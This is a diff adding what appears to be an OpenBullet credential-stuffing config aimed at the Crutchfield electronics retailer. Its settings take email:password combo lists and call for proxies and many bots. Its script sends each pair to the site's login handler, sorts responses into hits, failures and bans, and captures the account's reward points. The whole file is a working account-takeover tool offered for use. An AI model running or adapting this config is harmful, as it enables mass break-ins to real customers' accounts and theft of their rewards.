@@ -1,0 +1,70 @@
+[SETTINGS]
+{
+  "Name": "Crutchfield",
+  "SuggestedBots": 32,
+  "LastModified": "2018-09-26T08:11:41.1057444+00:00",
+  "AdditionalInfo": "Audio & Electronics | US PROXIES | Capture Rewards Points | 8-60 Bots (32Default)",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "5",
+      "Id": 355314462
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 545020473
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.crutchfield.com/Secure/handlers/Account/MyAccountLoggedOut.ashx" AutoRedirect=TRUE 
+  CONTENT "action=login&email=<USER>&password=<PASS>&rememberMe=true&dest=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.crutchfield.com/secure/account/login.aspx?d=1" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+REQUEST POST "https://www.crutchfield.com/Secure/handlers/Account/MyAccountLoggedOut.ashx" AutoRedirect=TRUE 
+  CONTENT "action=login&email=<USER>&password=<PASS>&rememberMe=true&dest=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.crutchfield.com/secure/account/login.aspx?d=1" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "failed" 
+  KEYCHAIN Success OR 
+    KEY "secure/account/" 
+  KEYCHAIN Ban OR 
+    KEY "null" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "notVerified" 
+REQUEST GET "https://www.crutchfield.com/secure/account/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "\"helperText\">" "<" Recursive=FALSE -> CAP "|" "" "" 
